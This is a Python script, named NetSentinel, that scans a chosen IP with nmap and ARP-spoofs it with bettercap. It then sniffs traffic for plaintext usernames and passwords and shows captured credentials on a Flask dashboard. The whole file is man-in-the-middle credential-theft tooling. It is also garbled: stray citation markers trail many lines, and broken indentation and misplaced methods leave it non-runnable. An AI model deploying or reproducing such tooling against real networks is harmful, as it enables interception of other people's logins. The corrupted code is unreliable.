import subprocess
import re
import threading
from flask import Flask, render_template
from scapy.all import sniff, Raw

app = Flask(__name__)

# Global data structures to store real-time results [cite: 355, 1083]
scan_results_global = []
captured_creds_global = []


class NetSentinel:
    """
    Main class for managing network reconnaissance and security operations. [cite: 213, 1345]
    """

    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.scan_results = []

    def detailed_scan(self):
        """
        Executes Nmap scan using subprocess with aggressive enumeration settings. [cite: 216, 1385]
        """
        print(f"[*] Initiating deep service enumeration for: {self.target_ip}")[cite: 92, 1425]
        # Using -sV for version detection and -T4 for faster execution [cite: 1421]
        cmd = ["nmap", "-sV", "-T4", "-F", "--version-light", self.target_ip][cite: 218, 1039]
        result = subprocess.run(cmd, capture_output=True, text=True)[cite: 311, 1039]
        return result.stdout

    def parse_results(self, nmap_data):
        """
        Parses raw Nmap text output into a structured list for the dashboard. [cite: 301, 1029]
        """
        print("  Analyzing raw scan data...")[cite: 221, 1426]
        for line in nmap_data.split("\n"):
            if "/tcp" in line and "open" in line: [cite: 223, 1390]
            parts = line.split()[cite: 224, 1391]
            port_info = parts[0][cite: 250, 1392]
            service_name = parts[2][cite: 251, 1393]
            version_info = " ".join(parts[3:])[cite: 252, 1394]

            result_entry = {
                "port": port_info,
                "service": service_name,
                "version": version_info
            }
            scan_results_global.append(result_entry)[cite: 317, 1045]

    return scan_results_global


def sniff_packets(self, packet):
    """
    Performs Deep Packet Inspection (DPI) to extract sensitive credentials. [cite: 187, 638]
    """
    if packet.haslayer(Raw): [cite: 328, 1509]
    load = packet[Raw].load.decode(errors='ignore')[cite: 330, 1510]
    # Targeted keyword filtering for unencrypted logins [cite: 189, 642]
    keywords = ["user", "pass", "login", "username", "password"][cite: 331, 1547]
    if any(word in load.lower() for word in keywords): [cite: 331]
    clean_data = load.split("\n")[-1][cite: 332]
    if clean_data not in captured_creds_global:
        captured_creds_global.append(clean_data)[cite: 334]
        print(f"[!] Credential Captured: {clean_data}")[cite: 335]


def start_mitm(self):
    """
    Automates ARP Spoofing using Bettercap to redirect traffic. [cite: 153, 584]
    """
    print(f"[*] Starting MITM redirection for: {self.target_ip}")[cite: 1555]
    # Command triggers bettercap in silent mode with ARP spoofing active [cite: 280, 1485]
    cmd = ["bettercap", "-eval", f"set arp.spoof.targets {self.target_ip}; arp.spoof on; net.sniff on"]
    subprocess.Popen(cmd)  # Running as a separate process [cite: 1569]


@app.route('/')
def dashboard():
    """
    Renders the live security dashboard using Jinja2 templates. [cite: 444, 445]
    """
    return render_template('index.html', scan_data=scan_results_global, captured_data=captured_creds_global)[cite: 357,
           1085]


if __name__ == "__main__":
    # User Input for Target IP - Dynamic and safe for GitHub [cite: 278, 1006]
    target = input("Enter the target IP address to analyze: ")
    scanner = NetSentinel(target)[cite: 347, 1406]

    # 1. Reconnaissance Phase [cite: 608, 1729]
    raw_output = scanner.detailed_scan()[cite: 348, 1408]
    scanner.parse_results(raw_output)[cite: 1410]

    # 2. Start MITM and Flask via Threading for Concurrency [cite: 286, 614]
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False)).start()[cite: 349, 1077]
    scanner.start_mitm()[cite: 350, 1603]

    # 3. Start Background Sniffing [cite: 291, 621]
    print("[*] Dashboard live at http://localhost:5000")[cite: 351, 1079]
    sniff(prn=scanner.sniff_packets, store=0)[cite: 352, 1080]